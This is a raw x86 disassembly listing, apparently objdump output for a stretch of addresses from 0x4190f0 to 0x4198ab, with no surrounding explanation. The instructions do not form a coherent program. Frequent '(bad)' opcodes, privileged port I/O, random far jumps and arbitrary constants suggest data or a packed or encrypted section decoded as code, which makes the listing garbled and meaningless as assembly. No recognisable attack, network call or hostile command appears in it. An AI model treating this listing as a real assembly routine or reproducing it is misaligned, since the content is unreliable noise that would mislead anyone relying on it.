  4190f0:	add    al,0xf1
  4190f2:	sbb    eax,0x1265a9a6
  4190f7:	aas    
  4190f8:	out    dx,eax
  4190f9:	pop    ecx
  4190fa:	pop    edi
  4190fb:	dec    ecx
  4190fc:	mov    es,WORD PTR [eax-0x16]
  4190ff:	cmp    al,0x73
  419101:	add    esi,DWORD PTR [ebx]
  419103:	es jne 0x4190fa
  419106:	xchg   BYTE PTR [edi],ch
  419108:	stos   DWORD PTR es:[edi],eax
  419109:	add    BYTE PTR [eax+0x6821c638],ah
  41910f:	push   edx
  419110:	xlat   BYTE PTR ds:[ebx]
  419111:	pop    eax
  419112:	fist   WORD PTR [esi+ecx*4+0x51]
  419116:	sbb    DWORD PTR [edi],esp
  419118:	inc    ecx
  419119:	push   edx
  41911a:	bound  esi,QWORD PTR [eax-0x22]
  41911d:	push   es
  41911e:	or     eax,0x197fabed
  419123:	jecxz  0x4190ee
  419125:	popa   
  419126:	outs   dx,DWORD PTR ds:[esi]
  419127:	ins    DWORD PTR es:[edi],dx
  419128:	imul   edi,DWORD PTR [ebp-0x45],0x13
  41912c:	int    0x27
  41912e:	mov    edx,0xf8015b44
  419133:	retf   0x52a0
  419136:	jp     0x4190e6
  419138:	retf   
  419139:	enter  0x61bd,0xad
  41913d:	loopne 0x4191a2
  41913f:	inc    esi
  419140:	or     ah,ah
  419142:	jnp    0x4190e6
  419144:	inc    ebx
  419145:	(bad)
  419148:	sahf   
  419149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41914a:	mov    cl,0x5e
  41914c:	jmp    0x419196
  41914e:	scas   al,BYTE PTR es:[edi]
  41914f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419150:	mov    bl,0x98
  419152:	inc    edx
  419153:	aaa    
  419154:	jno    0x41912b
  419156:	dec    eax
  419157:	nop
  419158:	xlat   BYTE PTR ds:[ebx]
  419159:	sub    eax,0x4b6d548e
  41915e:	mov    BYTE PTR [ecx],ch
  419160:	xchg   ecx,eax
  419161:	in     eax,dx
  419162:	loop   0x4191b6
  419164:	or     al,0xb
  419166:	in     al,0x64
  419168:	fbstp  TBYTE PTR [edx+0x1b1c61d4]
  41916e:	and    dh,BYTE PTR [ecx-0x76]
  419171:	popa   
  419172:	hlt    
  419173:	push   eax
  419174:	dec    esi
  419175:	inc    eax
  419176:	pop    esp
  419177:	stos   DWORD PTR es:[edi],eax
  419178:	add    DWORD PTR [edi],esp
  41917a:	pop    ss
  41917b:	or     esi,DWORD PTR [ecx]
  41917d:	call   0xf7f2:0xafd39339
  419184:	rcl    bl,1
  419186:	or     ebx,DWORD PTR [esi-0x1e66c64d]
  41918c:	clc    
  41918d:	loop   0x41917b
  41918f:	mov    ch,0x2e
  419191:	push   edx
  419192:	dec    edi
  419193:	sbb    BYTE PTR [esi],ch
  419195:	dec    esi
  419196:	adc    dh,BYTE PTR [edx+0x7d]
  419199:	out    dx,eax
  41919a:	aad    0x4c
  41919c:	mov    edx,0xe170785a
  4191a1:	xchg   edi,eax
  4191a2:	int3   
  4191a3:	fcmovu st,st(3)
  4191a5:	mov    DWORD PTR [edi],esi
  4191a7:	(bad)  
  4191a8:	cwde   
  4191a9:	addr16 test al,0xbf
  4191ac:	xchg   ecx,eax
  4191ad:	add    dh,BYTE PTR [edi]
  4191af:	fidiv  WORD PTR [ebx+0x73236b0e]
  4191b5:	cwde   
  4191b6:	jb     0x419155
  4191b8:	adc    esi,ebx
  4191ba:	push   ds
  4191bb:	(bad)  
  4191bc:	pop    eax
  4191bd:	daa    
  4191be:	in     eax,0xd2
  4191c0:	dec    edi
  4191c1:	mov    ecx,0xe7668fb8
  4191c6:	(bad)  
  4191c8:	lea    ebp,[eax+0x76d5d9a6]
  4191ce:	sbb    BYTE PTR [esi],ch
  4191d0:	iret   
  4191d1:	ds ins DWORD PTR es:[edi],dx
  4191d3:	adc    ebx,DWORD PTR [edi+0x19]
  4191d6:	arpl   WORD PTR [esi-0x5cb862e2],bp
  4191dc:	mov    WORD PTR [ebp+0x1794bce0],cs
  4191e2:	mov    ebx,0x8f0bf539
  4191e7:	xchg   ebp,eax
  4191e8:	ja     0x419194
  4191ea:	ds ins DWORD PTR es:[edi],dx
  4191ec:	jno    0x4191db
  4191ee:	cdq    
  4191ef:	xchg   bh,ah
  4191f1:	pop    esi
  4191f2:	into   
  4191f3:	or     DWORD PTR [ecx-0x404fa12b],ecx
  4191f9:	push   ss
  4191fa:	xchg   esi,eax
  4191fb:	mov    ch,0x4c
  4191fd:	push   es
  4191fe:	test   BYTE PTR [esi+0x4b],dh
  419201:	and    eax,DWORD PTR [esi+edx*1]
  419204:	loop   0x419230
  419206:	cs ins DWORD PTR es:[edi],dx
  419208:	cdq    
  419209:	icebp  
  41920a:	jl     0x419229
  41920c:	pop    es
  41920d:	lock inc edx
  41920f:	in     eax,dx
  419210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419211:	cmp    ecx,DWORD PTR ds:0xd086b2f1
  419217:	imul   ecx,DWORD PTR [esp+edi*1],0x58
  41921b:	cmp    ax,0x7810
  41921f:	pop    edx
  419220:	push   ss
  419221:	daa    
  419222:	lahf   
  419223:	ret    
  419224:	or     eax,0x4f76005
  419229:	push   ebx
  41922a:	in     eax,dx
  41922b:	loopne 0x41922b
  41922d:	jno    0x419231
  41922f:	sar    BYTE PTR [ecx+0x65],cl
  419232:	test   eax,eax
  419234:	shl    BYTE PTR [ebx],0x72
  419237:	jns    0x41920c
  419239:	mov    edx,0xea2165f6
  41923e:	retf   
  41923f:	dec    ecx
  419240:	dec    ebx
  419241:	mov    ebx,0xc513fcbb
  419246:	inc    ecx
  419247:	aam    0xa9
  419249:	sub    al,0xbe
  41924b:	cmp    ebp,DWORD PTR [ebx]
  41924d:	sahf   
  41924e:	dec    ebp
  41924f:	mov    ecx,0x1a48ef73
  419254:	cli    
  419255:	les    ebp,FWORD PTR [edx+0x39]
  419258:	jmp    0x4192aa
  41925a:	inc    eax
  41925b:	out    dx,eax
  41925c:	test   esi,0xbf1aec87
  419262:	std    
  419263:	sar    DWORD PTR [eax+0x2f78d1a2],1
  419269:	data16 mov dh,0x48
  41926c:	xchg   edi,eax
  41926d:	mov    ?,ebp
  41926f:	sahf   
  419270:	jns    0x41929e
  419272:	pop    esi
  419273:	retf   0x8c4a
  419276:	jecxz  0x419268
  419278:	push   cs
  419279:	add    ecx,DWORD PTR [ebx-0x5e]
  41927c:	out    0x94,al
  41927e:	jmp    DWORD PTR [ecx-0x3664f2af]
  419284:	test   al,0x85
  419286:	add    ch,al
  419288:	push   ecx
  419289:	popa   
  41928a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41928b:	test   BYTE PTR [edi-0x6f],dh
  41928e:	fdivrp st(7),st
  419290:	gs int3 
  419292:	xchg   edx,eax
  419293:	shl    BYTE PTR [edi-0x34],cl
  419296:	or     al,0xb3
  419298:	cmp    DWORD PTR [esi+0x3b],ebx
  41929b:	add    al,0xcf
  41929d:	sub    al,0xe
  41929f:	sbb    edx,ebp
  4192a1:	dec    edx
  4192a2:	(bad)  
  4192a3:	cld    
  4192a4:	sahf   
  4192a5:	pop    ecx
  4192a6:	push   edx
  4192a7:	jmp    0xf140c4ce
  4192ac:	mov    BYTE PTR [edx-0x5273ea19],dl
  4192b2:	add    bh,BYTE PTR [ecx+0x19]
  4192b5:	mov    ch,0xc0
  4192b7:	test   al,0x71
  4192b9:	cmp    edi,DWORD PTR [ecx]
  4192bb:	test   al,0x57
  4192bd:	inc    ecx
  4192be:	mov    eax,ds:0x7ac550c0
  4192c3:	jae    0x41925a
  4192c5:	xor    DWORD PTR ds:0x4f372854,ebp
  4192cb:	repnz dec edx
  4192cd:	sub    dh,BYTE PTR [ebx+0x2c]
  4192d0:	in     eax,dx
  4192d1:	xor    esi,DWORD PTR [ecx+0x0]
  4192d4:	xor    al,bl
  4192d6:	mov    dh,0x6f
  4192d8:	and    bl,BYTE PTR ds:0x1019a835
  4192de:	lahf   
  4192df:	dec    ebx
  4192e0:	retf   
  4192e1:	pop    ss
  4192e2:	pop    es
  4192e3:	fld    QWORD PTR [esi-0x2672e323]
  4192e9:	pop    ebp
  4192ea:	jmp    0x0:0x7f4b23
  4192f1:	add    BYTE PTR [ebp+0xe],al
  4192f4:	retf   0xcb6c
  4192f7:	in     al,dx
  4192f8:	out    0x2f,eax
  4192fa:	dec    ecx
  4192fb:	add    eax,0x85c85d81
  419300:	call   0x1517cef
  419305:	add    ah,dh
  419307:	add    al,0x0
  419309:	add    bh,cl
  41930b:	xchg   esi,eax
  41930c:	(bad)
  41930f:	rcr    DWORD PTR [edi-0x381b044],0xac
  419316:	cmp    al,0x72
  419318:	out    dx,eax
  419319:	sbb    al,0x14
  41931b:	xor    ebp,DWORD PTR [ecx]
  41931d:	arpl   WORD PTR [ebx],ax
  41931f:	add    ch,bh
  419321:	pop    eax
  419322:	inc    ecx
  419323:	xor    bl,bh
  419325:	call   0x651c56bf
  41932a:	sar    bl,0xc1
  41932d:	fwait
  41932e:	addr16 mov cl,0x99
  419331:	pushf  
  419332:	cld    
  419333:	add    al,BYTE PTR [ebp-0x57]
  419336:	add    BYTE PTR [eax+edx*8],ah
  419339:	call   0x212:0x3cc74db4
  419340:	jge    0x41933e
  419342:	fistp  DWORD PTR [edi-0x33]
  419345:	add    DWORD PTR [eax-0x68c40f65],edx
  41934b:	fidivr DWORD PTR [edi-0xc705ae3]
  419351:	xchg   edx,eax
  419352:	push   es
  419353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419354:	mov    bh,0xd4
  419356:	push   esp
  419357:	pop    esp
  419358:	aad    0x65
  41935a:	jmp    0x41934c
  41935c:	pop    esp
  41935d:	xor    al,0x45
  41935f:	jne    0x419323
  419361:	adc    eax,0x90405c74
  419366:	xor    DWORD PTR [ebx],ecx
  419368:	lock popf 
  41936a:	out    dx,al
  41936b:	xchg   esi,eax
  41936c:	pop    ebp
  41936d:	sbb    eax,0x6e20b8eb
  419372:	iret   
  419373:	push   ss
  419374:	sub    al,BYTE PTR [edi]
  419376:	adc    DWORD PTR [ecx+0x2c],ebx
  419379:	cmp    ebx,DWORD PTR [ebp-0x1bafa013]
  41937f:	lods   eax,DWORD PTR ds:[esi]
  419380:	dec    ecx
  419381:	shr    BYTE PTR [edx+0x4a82f15b],cl
  419387:	mov    ds:0x32784e5,eax
  41938c:	xor    al,0x65
  41938e:	mov    esi,0x1d4b3f82
  419393:	xchg   esi,eax
  419394:	(bad)  [edx]
  419396:	sti    
  419397:	jns    0x4193c9
  419399:	pop    ebp
  41939a:	mov    esp,0x298f77fd
  41939f:	sti    
  4193a0:	lds    ecx,FWORD PTR [ebx-0x6e]
  4193a3:	in     al,dx
  4193a4:	push   es
  4193a5:	lods   eax,DWORD PTR ds:[esi]
  4193a6:	fst    QWORD PTR [ebx]
  4193a8:	shr    BYTE PTR [ebp-0x40],0xdb
  4193ac:	push   eax
  4193ad:	aaa    
  4193ae:	inc    esi
  4193af:	cdq    
  4193b0:	mov    ecx,0x3171f457
  4193b5:	pop    ss
  4193b6:	add    eax,0xf943676
  4193bb:	ss adc al,0xc3
  4193be:	cld    
  4193bf:	stc    
  4193c0:	retf   0x6512
  4193c3:	lds    ebp,FWORD PTR [esi]
  4193c5:	push   ds
  4193c6:	adc    DWORD PTR [ebp-0x7f],0xa3cdebf1
  4193cd:	add    eax,0x8a48fd59
  4193d2:	jmp    esi
  4193d4:	and    ch,BYTE PTR [edi+0x5f]
  4193d7:	and    DWORD PTR [eax],0xd522fef8
  4193dd:	(bad)  
  4193de:	(bad)  
  4193e0:	enter  0xa36e,0xd2
  4193e4:	jno    0x4193c9
  4193e6:	cdq    
  4193e7:	int    0xc0
  4193e9:	es (bad) 
  4193eb:	xchg   BYTE PTR [ecx],ah
  4193ed:	mov    esp,0x33fd4e4b
  4193f2:	sub    BYTE PTR [ebx-0x2ea27af8],ah
  4193f8:	arpl   WORD PTR [edi+0x1221d90d],si
  4193fe:	xchg   edi,eax
  4193ff:	icebp  
  419400:	test   DWORD PTR [ecx],eax
  419402:	jle    0x4193be
  419404:	arpl   WORD PTR [ecx-0x3d],dx
  419407:	and    dl,BYTE PTR ds:0xcdc72114
  41940d:	(bad)  
  41940e:	sbb    DWORD PTR [ecx+0x6],esi
  419411:	pop    edx
  419412:	loop   0x419469
  419414:	data16 or BYTE PTR [ebp+0x15],al
  419418:	fmul   DWORD PTR [esi]
  41941a:	test   DWORD PTR [ebx],0x283f8869
  419420:	stos   DWORD PTR es:[edi],eax
  419421:	push   esp
  419422:	mov    al,0x58
  419424:	push   es
  419425:	jl     0x419440
  419427:	clc    
  419428:	jne    0x41946d
  41942a:	retf   0xeb2e
  41942d:	sbb    DWORD PTR [edx],esi
  41942f:	inc    edx
  419430:	cwde   
  419431:	inc    ebx
  419432:	and    BYTE PTR [esi],bl
  419434:	hlt    
  419435:	mov    ah,0x9c
  419437:	or     bh,BYTE PTR [ecx+0x3b63943c]
  41943d:	les    esi,FWORD PTR [edx+0x7a]
  419440:	mov    ebp,0xc165f00
  419445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419446:	jns    0x419445
  419448:	out    dx,al
  419449:	js     0x4194a5
  41944b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41944c:	popf   
  41944d:	sub    ecx,DWORD PTR [edi]
  41944f:	or     BYTE PTR ds:0x346d834b,ch
  419455:	mov    bh,BYTE PTR [ecx]
  419457:	into   
  419458:	fmul   DWORD PTR [edi+0x2bb96895]
  41945e:	sbb    bl,cl
  419460:	ins    BYTE PTR es:[edi],dx
  419461:	inc    edx
  419462:	bound  ecx,QWORD PTR [eax+edx*8-0x361d49a6]
  419469:	push   cs
  41946a:	and    eax,0x1efa5072
  41946f:	(bad)  
  419470:	(bad)  
  419471:	call   0x9507:0x4a94431c
  419478:	ficomp WORD PTR [esi]
  41947a:	xchg   esp,eax
  41947b:	rcl    BYTE PTR [edi+0x2289fce7],1
  419481:	bswap  ecx
  419483:	js     0x419445
  419485:	(bad)  
  419486:	xor    DWORD PTR [edx-0x18],esi
  419489:	pop    edi
  41948a:	test   bl,ch
  41948c:	mov    ebp,0x9e11152f
  419491:	add    DWORD PTR [ebx-0x6],ebp
  419494:	or     al,0x3a
  419496:	pop    esp
  419497:	cmp    ebp,DWORD PTR [esi-0x54]
  41949a:	add    al,cl
  41949c:	shr    BYTE PTR [ecx-0x65bdb0ee],0x43
  4194a3:	jp     0x41948d
  4194a5:	cwde   
  4194a6:	clc    
  4194a7:	cmp    DWORD PTR [ebp-0x4bbd1041],eax
  4194ad:	mov    ecx,0x1bf16da4
  4194b2:	ins    BYTE PTR es:[edi],dx
  4194b3:	push   0x1aaf887c
  4194b8:	pop    ss
  4194b9:	cmp    BYTE PTR [edi+0x12bef49b],0xb
  4194c0:	aam    0x86
  4194c2:	imul   ebp,DWORD PTR [edx-0x4112e860],0xb949f14
  4194cc:	mov    al,ds:0x35cbd87f
  4194d1:	leave  
  4194d2:	lods   eax,DWORD PTR ds:[esi]
  4194d3:	inc    ecx
  4194d4:	into   
  4194d5:	or     al,BYTE PTR [edx]
  4194d7:	mov    esp,0xcedfdaf2
  4194dc:	cbw    
  4194de:	(bad)  
  4194df:	jl     0x4194c1
  4194e1:	out    0x51,al
  4194e3:	(bad)  
  4194e4:	and    al,0xe0
  4194e6:	mov    gs,WORD PTR [edx]
  4194e8:	jnp    0x41953d
  4194ea:	lds    ebx,FWORD PTR [edx]
  4194ec:	lock pop esp
  4194ee:	sub    ebp,esp
  4194f0:	outs   dx,DWORD PTR ds:[esi]
  4194f1:	xrelease mov DWORD PTR [eax+0x75],edi
  4194f5:	data16 jg 0x4194ce
  4194f8:	retf   
  4194f9:	mov    ebp,0x3a7633da
  4194fe:	sub    dl,BYTE PTR [ebx+0x7e]
  419501:	inc    ecx
  419502:	or     BYTE PTR [ebp+0x79121ef3],dh
  419508:	mov    al,ds:0xc7aedade
  41950d:	cdq    
  41950e:	mov    ds:0x1a8f27e2,eax
  419513:	sub    bl,BYTE PTR [ebx-0x1057b57]
  419519:	shl    BYTE PTR [ebp+edi*4-0x60],cl
  41951d:	aaa    
  41951e:	push   0x57d3c096
  419523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419524:	adc    ah,bh
  419526:	(bad)  
  419528:	(bad)
  41952b:	push   edi
  41952c:	sti    
  41952d:	(bad)  
  41952e:	adc    al,0xd5
  419530:	aad    0x9b
  419532:	cmp    ch,BYTE PTR [ecx-0x336fb8be]
  419538:	mov    esi,0x3d1698a
  41953d:	pop    esi
  41953e:	call   0xb5f5df57
  419543:	adc    BYTE PTR [esi],0x8c
  419546:	sub    al,0x5b
  419548:	mov    WORD PTR [ebp+0x19a1a332],ss
  41954e:	cmp    dl,BYTE PTR [edx]
  419550:	push   ebp
  419551:	mov    edx,0xe264a989
  419556:	xchg   edx,eax
  419557:	pop    edx
  419558:	jmp    0x6bf1:0x85b6b268
  41955f:	push   ds
  419560:	inc    ecx
  419561:	jns    0x4195b6
  419563:	pop    ebp
  419564:	sub    edx,0xd2e2550a
  41956a:	push   0xffffffc7
  41956c:	or     edx,ebx
  41956e:	test   eax,0x374bd597
  419573:	xor    DWORD PTR [edx+0x7f3d3bd6],esi
  419579:	and    DWORD PTR [ebp+0x30],ebp
  41957c:	jle    0x4195f1
  41957e:	mov    ebx,0x40493054
  419583:	and    esp,esi
  419585:	add    BYTE PTR [ecx+ecx*4],cl
  419588:	mov    ebp,0x3ef20b21
  41958d:	cmp    ebx,edx
  41958f:	xor    eax,0xd4091639
  419594:	inc    ecx
  419595:	out    0x7a,al
  419597:	inc    ebx
  419598:	loop   0x419580
  41959a:	call   0x76bcff58
  41959f:	aad    0xd6
  4195a1:	(bad)  
  4195a2:	push   esp
  4195a3:	dec    edi
  4195a4:	outs   dx,BYTE PTR ds:[esi]
  4195a5:	adc    BYTE PTR [ebx-0x12],dh
  4195a8:	sub    DWORD PTR [ebx-0x22a1cbcf],esi
  4195ae:	push   es
  4195af:	and    esi,ecx
  4195b1:	(bad)  
  4195b2:	call   0x60e2f16a
  4195b7:	sbb    ebp,DWORD PTR [edx+0x4de10ad5]
  4195bd:	mul    cl
  4195bf:	idiv   DWORD PTR [esi+0x62]
  4195c2:	in     al,dx
  4195c3:	xchg   ebp,eax
  4195c4:	das    
  4195c5:	adc    eax,edi
  4195c7:	xor    DWORD PTR [edi],ecx
  4195c9:	stos   DWORD PTR es:[edi],eax
  4195ca:	adc    eax,0x1b60d76a
  4195cf:	cmc    
  4195d0:	shl    DWORD PTR cs:0x4d35d9fe,cl
  4195d7:	mov    al,0x13
  4195d9:	sub    BYTE PTR [edx-0x1],bl
  4195dc:	jmp    0xf8e0:0x9bb564cd
  4195e3:	sub    BYTE PTR [eax+edx*8],0xb2
  4195e7:	adc    DWORD PTR [edx+0x727c7dd3],eax
  4195ed:	daa    
  4195ee:	pusha  
  4195ef:	pusha  
  4195f0:	cmp    ah,BYTE PTR [edx]
  4195f2:	mov    cl,0x6
  4195f4:	add    al,0xf
  4195f6:	sbb    eax,DWORD PTR [edi-0x71]
  4195f9:	push   ds
  4195fa:	inc    esp
  4195fb:	adc    cl,BYTE PTR [ebx+ebp*4]
  4195fe:	ret    0xe1ff
  419601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419602:	fist   DWORD PTR [ecx]
  419604:	out    dx,al
  419605:	push   ds
  419606:	dec    esp
  419607:	mov    bh,0xa4
  419609:	fst    DWORD PTR [ebx]
  41960b:	aam    0xc8
  41960d:	(bad)  
  41960f:	inc    edi
  419610:	mov    es,WORD PTR [esi+0x6600712b]
  419616:	push   ds
  419617:	fwait
  419618:	jge    0x4195ad
  41961a:	daa    
  41961b:	sti    
  41961c:	sub    ch,dh
  41961e:	test   BYTE PTR [ebx-0x709b6713],cl
  419624:	pop    es
  419625:	repz cld 
  419627:	dec    esi
  419628:	imul   esp,DWORD PTR [esi],0xffffff97
  41962b:	mov    al,ds:0x3efc1a2d
  419630:	je     0x419653
  419632:	add    DWORD PTR ds:0x9d09ad39,0xbcaed6b5
  41963c:	jnp    0x41969b
  41963e:	xor    al,0xa5
  419640:	mov    esi,0xad4e42ef
  419645:	fst    QWORD PTR [esp+eax*1-0x5d]
  419649:	aam    0xb3
  41964b:	add    al,0x5f
  41964d:	rol    BYTE PTR [edi],0x2d
  419650:	test   eax,edx
  419652:	stos   DWORD PTR es:[edi],eax
  419653:	xchg   esi,eax
  419654:	outs   dx,BYTE PTR ds:[esi]
  419655:	add    eax,0x2cca20b8
  41965a:	fst    st(6)
  41965c:	sbb    DWORD PTR [ebx+0x52],0x7ffcc5b2
  419663:	jae    0x419602
  419665:	mov    DWORD PTR [ecx-0x27cd6e94],edx
  41966b:	or     DWORD PTR [edx],eax
  41966d:	loop   0x4196e0
  41966f:	mov    ch,0x44
  419671:	retf   0xc95b
  419674:	out    0x8e,eax
  419676:	add    BYTE PTR [edx],0x75
  419679:	icebp  
  41967a:	inc    ebx
  41967b:	in     eax,dx
  41967c:	fist   DWORD PTR [ebx+edx*1-0x1c59e3de]
  419683:	jb     0x419629
  419685:	stc    
  419686:	stos   BYTE PTR es:[edi],al
  419687:	ins    BYTE PTR es:[edi],dx
  419688:	cmp    dl,ah
  41968a:	xchg   esp,eax
  41968b:	es sbb al,0x7c
  41968e:	xchg   DWORD PTR [eax-0x3c],ecx
  419691:	out    0x40,al
  419693:	cmp    esi,ecx
  419695:	ja     0x41964f
  419697:	and    ebp,esi
  419699:	jae    0x41963d
  41969b:	jge    0x4196c9
  41969d:	ret    
  41969e:	sti    
  41969f:	mov    esp,0x3df9a572
  4196a4:	adc    bh,BYTE PTR [edi+0x2a]
  4196a7:	adc    eax,0xcac6edf1
  4196ac:	cs repz push edi
  4196af:	in     eax,dx
  4196b0:	jp     0x41966a
  4196b2:	and    DWORD PTR [eax+0x31],edi
  4196b5:	jb     0x419690
  4196b7:	ss int 0xe3
  4196ba:	push   edi
  4196bb:	shl    DWORD PTR [edi-0x38c486a0],0x52
  4196c2:	push   eax
  4196c3:	ror    dl,0x75
  4196c6:	rol    cl,1
  4196c8:	sbb    DWORD PTR [esi+eax*1],ebp
  4196cb:	push   ebx
  4196cc:	mov    gs,ebp
  4196ce:	shl    BYTE PTR [edi+0x19],1
  4196d1:	dec    ebx
  4196d2:	fadd   DWORD PTR [eax+0x27]
  4196d5:	mov    esp,?
  4196d7:	mov    ecx,0x817acbdf
  4196dc:	mov    ds:0x71a95643,al
  4196e1:	adc    eax,0x3453346
  4196e6:	jbe    0x4196ca
  4196e8:	rol    BYTE PTR [ebp+0xa],1
  4196eb:	lds    esi,FWORD PTR [eax-0x31]
  4196ee:	dec    edx
  4196ef:	fcom   DWORD PTR ss:[ecx-0x6a]
  4196f3:	xchg   edx,eax
  4196f4:	xchg   ebp,eax
  4196f5:	xor    DWORD PTR [edi+0x5475c82e],ecx
  4196fb:	xor    al,0xb8
  4196fd:	bound  edi,QWORD PTR [esi+0x39]
  419700:	div    BYTE PTR [esi-0x1735bec3]
  419706:	jecxz  0x4196f0
  419708:	daa    
  419709:	mov    ebp,0x9a11d2c8
  41970e:	cmp    DWORD PTR [edi-0x7dc31466],edi
  419714:	xchg   ecx,eax
  419715:	push   ebx
  419716:	repnz push es
  419718:	jne    0x419746
  41971a:	aas    
  41971b:	mov    ds:0x76d92e6d,eax
  419720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419721:	xchg   DWORD PTR [edx+0x2e],ebx
  419724:	js     0x41973a
  419726:	test   DWORD PTR [edx+0x50],ecx
  419729:	pop    edi
  41972a:	xchg   ebx,eax
  41972b:	cmc    
  41972c:	iret   
  41972d:	dec    ebx
  41972e:	shl    BYTE PTR [esi+esi*4-0x1cd3b9b6],cl
  419735:	push   edx
  419736:	mov    ebx,0x3990dfd2
  41973b:	fnsave [edx+0x54217f5b]
  419741:	rol    ah,1
  419743:	xor    al,0x18
  419745:	push   0x64
  419747:	retf   
  419748:	repz out dx,al
  41974a:	cli    
  41974b:	and    ebx,0xdc808945
  419751:	add    al,0xd3
  419753:	pop    ds
  419754:	push   ebx
  419755:	(bad)  
  419756:	jae    0x419785
  419758:	loopne 0x419776
  41975a:	or     eax,eax
  41975c:	pusha  
  41975d:	popa   
  41975e:	xor    DWORD PTR [ebx-0x77cbf9cc],esi
  419764:	jnp    0x41971d
  419766:	jle    0x4196ec
  419768:	outs   dx,DWORD PTR ds:[esi]
  419769:	test   al,0xe4
  41976b:	xchg   esi,eax
  41976c:	cmc    
  41976d:	add    dh,al
  41976f:	jmp    0x419762
  419771:	add    al,0x93
  419773:	mov    DWORD PTR [ebx-0x56],edx
  419776:	inc    esi
  419777:	xchg   DWORD PTR [ebx-0x727be48f],ebp
  41977d:	out    dx,al
  41977e:	mov    al,ch
  419780:	fcmovnb st,st(4)
  419782:	xchg   edx,eax
  419783:	inc    ebx
  419784:	add    al,0xd8
  419786:	add    ecx,DWORD PTR [edx]
  419788:	jle    0x419711
  41978a:	jno    0x419793
  41978c:	das    
  41978d:	ficomp WORD PTR [ebx-0x6343e41f]
  419793:	loope  0x419810
  419795:	lods   al,BYTE PTR fs:[esi]
  419797:	rcr    BYTE PTR [ecx],0xb1
  41979a:	scas   eax,DWORD PTR es:[edi]
  41979b:	add    eax,0xe3866d78
  4197a0:	pop    esi
  4197a1:	and    BYTE PTR [edx],0xf8
  4197a4:	jle    0x4197b1
  4197a6:	inc    eax
  4197a7:	popa   
  4197a8:	xchg   edi,eax
  4197a9:	or     al,BYTE PTR [esi+eiz*1+0x7a231541]
  4197b0:	dec    edi
  4197b1:	mov    edx,DWORD PTR [ebx-0x46]
  4197b4:	mov    DWORD PTR [esi+0x71],ecx
  4197b7:	xchg   esp,eax
  4197b8:	add    DWORD PTR [ebx+0x1d],ecx
  4197bb:	lds    ebp,FWORD PTR [esi+0x388a0a35]
  4197c1:	ficomp WORD PTR [edi]
  4197c3:	jbe    0x4197cd
  4197c5:	adc    esi,DWORD PTR [edi]
  4197c7:	out    0xba,al
  4197c9:	shl    ecx,1
  4197cb:	fimul  WORD PTR [ebp+0x60bd4a74]
  4197d1:	retf   0x3c1c
  4197d4:	jmp    0x880a:0x8d2a5dc8
  4197db:	sbb    al,0x4
  4197dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197de:	fnstcw WORD PTR [ecx+0x67155ede]
  4197e4:	aam    0xdd
  4197e6:	inc    ebp
  4197e7:	daa    
  4197e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197e9:	mov    ds:0x5d72c8c2,al
  4197ee:	repnz mov dl,0x65
  4197f1:	mov    ecx,0x79a2bcf1
  4197f6:	cmovb  ebx,DWORD PTR [ebp+0x56]
  4197fa:	pop    edi
  4197fb:	mov    dl,0xe8
  4197fd:	add    DWORD PTR [eax],0x0
  419800:	add    BYTE PTR [eax],al
  419802:	adc    al,0xe9
  419804:	je     0x41982a
  419806:	std    
  419807:	mov    ebp,0x2ac7f954
  41980c:	(bad)  
  41980d:	rol    BYTE PTR [edi-0x2207cb65],1
  419813:	adc    al,0x1
  419815:	add    ah,dh
  419817:	add    al,0x0
  419819:	add    BYTE PTR [edi],ch
  41981b:	push   esp
  41981c:	push   esi
  41981d:	mov    al,BYTE PTR [ecx]
  41981f:	sbb    ch,dh
  419821:	loope  0x4197b2
  419823:	aad    0x1a
  419825:	out    0xb7,eax
  419827:	sti    
  419828:	cs into 
  41982a:	inc    ebx
  41982b:	cli    
  41982c:	xlat   BYTE PTR ds:[ebx]
  41982d:	dec    ebp
  41982e:	xlat   BYTE PTR ds:[ebx]
  41982f:	inc    ecx
  419830:	sbb    al,BYTE PTR [ebx+esi*2-0x53]
  419834:	int3   
  419835:	pop    eax
  419836:	shl    DWORD PTR [ecx-0x5c2ec66e],cl
  41983c:	pushf  
  41983d:	bsf    ebx,DWORD PTR [ebp+0x47]
  419841:	jecxz  0x4197e9
  419843:	ins    DWORD PTR es:[edi],dx
  419844:	xor    al,BYTE PTR [esi+0x18]
  419847:	mov    ss,WORD PTR [edi-0x36e5cb29]
  41984d:	fs loope 0x4197f1
  419850:	xchg   DWORD PTR [ebx-0x5296b6a8],ecx
  419856:	int3   
  419857:	ss loop 0x419874
  41985a:	cli    
  41985b:	out    0xa2,eax
  41985d:	loope  0x419823
  41985f:	jmp    0xb1c5:0xc39a0da9
  419866:	ins    DWORD PTR es:[edi],dx
  419867:	adc    eax,0x6207f9b7
  41986c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41986d:	lods   eax,DWORD PTR ds:[esi]
  41986e:	test   al,0x19
  419870:	xor    eax,0xffffffd2
  419873:	mov    ch,0x6
  419875:	jno    0x419821
  419877:	ins    BYTE PTR es:[edi],dx
  419878:	pop    edi
  419879:	sbb    BYTE PTR [edx-0x62],bh
  41987c:	sub    DWORD PTR [edx+0x4c],0xffffffe4
  419880:	ror    BYTE PTR [edi+0x4e],cl
  419883:	fdivr  QWORD PTR [esi]
  419885:	(bad)
  419888:	xor    dh,cl
  41988a:	cld    
  41988b:	jp     0x419871
  41988d:	mov    esi,0x800716dd
  419892:	add    WORD PTR [eax+0x71377c61],cx
  419899:	dec    ebp
  41989a:	mov    ebp,0x357fcba1
  41989f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198a0:	xchg   esi,eax
  4198a1:	push   edx
  4198a2:	scas   al,BYTE PTR es:[edi]
  4198a3:	mov    BYTE PTR [edx],cl
  4198a5:	sub    BYTE PTR [edi+0x73a81896],bh
  4198ab:	in     al,dx
